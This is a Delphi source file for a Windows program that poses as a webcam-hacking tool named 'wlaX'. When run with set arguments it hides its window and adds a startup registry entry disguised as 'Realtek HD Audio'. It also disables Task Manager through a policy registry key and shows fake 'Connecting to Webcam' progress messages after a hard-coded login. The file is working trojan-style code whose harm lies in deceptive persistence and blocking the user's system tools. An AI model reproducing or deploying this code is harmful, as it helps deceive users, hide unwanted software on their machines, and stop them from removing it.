unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.Menus, ShellApi, Registry;

type
  TForm1 = class(TForm)
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    TrayIcon1: TTrayIcon;
    Label4: TLabel;
    Label5: TLabel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    Label6: TLabel;
    Label7: TLabel;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

uses Unit2;


procedure RunOnStartup(
  sProgTitle,
  sCmdLine    : string;
  bRunOnce    : boolean );
var
  sKey : string;
  reg  : TRegIniFile;
begin
  if( bRunOnce )then
    sKey := 'Once'
  else
    sKey := '';

  reg := TRegIniFile.Create( '' );
  reg.RootKey := HKEY_CURRENT_USER;
  reg.WriteString(
    'SOFTWARE\Microsoft'
    + '\Windows\CurrentVersion\Run'
    + sKey + #0,
    sProgTitle,
    sCmdLine );
  reg.Free;
end;


procedure DCAD;
var
Reg: TRegistry;
begin
Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_CURRENT_USER;
    if Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System',True) then
      Reg.WriteInteger('DisableTaskMgr',1);
  finally
    Reg.CloseKey;
    Reg.Free;
  end;
end;


function IsUserAnAdmin(): BOOL; external shell32;


procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 Self.Hide;
 WindowState := wsMinimized;
 TrayIcon1.Visible := False;

abort;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
 i : integer;
begin
ParamCount;
ParamStr(0);
for i := 1 to System.ParamCount do
  begin
    if LowerCase(ParamStr(i)) = 'x' then
      begin
        Self.Hide;
        WindowState := wsMinimized;
        TrayIcon1.Visible := False;
        ShowWindow(Application.Handle, SW_Hide);
        DCAD;
      end
    else
      begin
        if IsUserAnAdmin then
          begin
            ParamCount;
            ParamStr(0);
            for i := 1 to System.ParamCount do
              begin
                if LowerCase(ParamStr(i)) = 's' then
                  begin
                    Edit2.Font.Name := 'Wingdings';
                    Edit2.PasswordChar := 'l';
                    Sleep(333);
                    RunOnStartup(
                      'Realtek HD Audio',
                      'C:\ProgramData\RealtekHDAudio.exe x',
                    False );
                    DCAD;
                  end;
              end;
          end
    else
      begin
        Sleep(1000);
        Showmessage('Could not connect to wlaX servers! Please run wlaX as administrator!');
        Application.Terminate;
      end;
  end;
  end;

end;





procedure TForm1.Button1Click(Sender: TObject);
begin
 if Edit1.Text = '391780' then
  begin
  if Edit2.Text = '12345' then
   begin
    Sleep(500);
    Application.ProcessMessages;
    Label3.Caption:= 'Connecting..';
    Sleep(3000);
    Application.ProcessMessages;
    Label3.Caption:= 'Probing..';
    Sleep(250);
    Application.ProcessMessages;
    Label3.Caption:= 'Connecting to Webcam..';
    Sleep(750);
    Application.ProcessMessages;
    Label3.Caption:= 'Connecting to Webcam..';
    Sleep(250);
    Application.ProcessMessages;
    Label3.Caption:= 'Connected!';
    Sleep(2350);
    Form2.Show;
   end
   else
    begin
     Sleep(1337);
     ShowMessage('Invalid ID or Password!');
    end;
  end
 else
  begin
    Sleep(1337);
    ShowMessage('Invalid ID or Password!');
  end;
end;

end.